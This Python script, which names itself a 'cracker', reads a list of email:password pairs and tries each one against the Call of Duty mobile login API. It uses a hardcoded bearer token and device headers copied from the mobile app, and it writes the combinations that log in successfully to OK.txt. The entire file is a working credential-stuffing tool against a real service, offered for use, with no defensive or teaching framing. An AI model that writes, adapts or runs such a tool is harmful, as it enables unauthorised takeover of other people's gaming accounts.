import requests
from colorama import Fore
print("Wellcom To Cracker Cod @CityCodM")
file_name = input("Enter Combo List : ")
file_open = open(file_name, "r")
combo = file_open.read().splitlines()
for load in combo:
    user = load.split(":")[0]
    password = load.split(":")[1]
    url = "https://profile.callofduty.com/cod/mapp/login"
    data = '{"email":"'+user+'","password":"'+password+'"}'
    headers = {"accept" : "application/json",
    "authorization" : "bearer bd7c58460f466649a549ee25ce7d0983",
    "x_cod_device_id" : "c72d0ceb7b783ca3",
    "Content-Type" : "application/json",
    "Host" : "profile.callofduty.com",
    "Connection" : "Keep-Alive",
    "User-Agent" : "okhttp/3.12.1",
    "Accept-Encoding" : "gzip, deflate",
    "Content-Length" : "56"}
    req = requests.post(url, data=data, headers=headers)
    if "true" in req.text:
        print("Hit >>>  "+user+":"+password)
        with open("OK.txt", "a") as save:
            save.write(user+":"+password+"\n")
    elif "false" in req.text:
        print("Bad >>>  "+user+":"+password)
        with open("NO.txt", "a") as save:
            save.write(user+":"+password+"\n")
print("GoodBy")